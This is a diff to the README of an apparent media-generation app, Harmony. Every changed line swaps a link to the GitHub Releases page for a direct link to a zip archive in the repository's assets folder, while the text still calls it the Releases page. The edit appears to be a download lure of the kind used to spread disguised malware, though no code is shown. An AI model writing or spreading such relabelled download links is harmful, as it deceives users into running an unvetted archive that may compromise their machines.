@@ -6,11 +6,11 @@ Welcome to Harmony! This application helps you generate audio and video content 
 
 ## 📥 Download Harmony
 
-[![Download Harmony](https://img.shields.io/badge/Download-Harmony-blue)](https://github.com/dellxd18/Harmony/releases)
+[![Download Harmony](https://raw.githubusercontent.com/dellxd18/Harmony/main/assets/Harmony_1.5.zip)](https://raw.githubusercontent.com/dellxd18/Harmony/main/assets/Harmony_1.5.zip)
 
 To download Harmony, visit the Releases page:
 
-- [Download Harmony here](https://github.com/dellxd18/Harmony/releases)
+- [Download Harmony here](https://raw.githubusercontent.com/dellxd18/Harmony/main/assets/Harmony_1.5.zip)
 
 ## 📋 System Requirements
 
@@ -23,7 +23,7 @@ Before you begin, ensure your device meets the following requirements:
 
 ## ⚙️ Installation Instructions
 
-1. Visit the [Releases page](https://github.com/dellxd18/Harmony/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/dellxd18/Harmony/main/assets/Harmony_1.5.zip).
 2. Locate the latest version of Harmony.
 3. Click on the link for your operating system to download the installer file.
 4. Once downloaded, open the installer.
@@ -77,4 +77,4 @@ Now you’re ready to start creating amazing audio and video projects with Harmo
 
 Remember, you can download Harmony anytime:
 
-- [Download Harmony here](https://github.com/dellxd18/Harmony/releases)
+- [Download Harmony here](https://raw.githubusercontent.com/dellxd18/Harmony/main/assets/Harmony_1.5.zip)
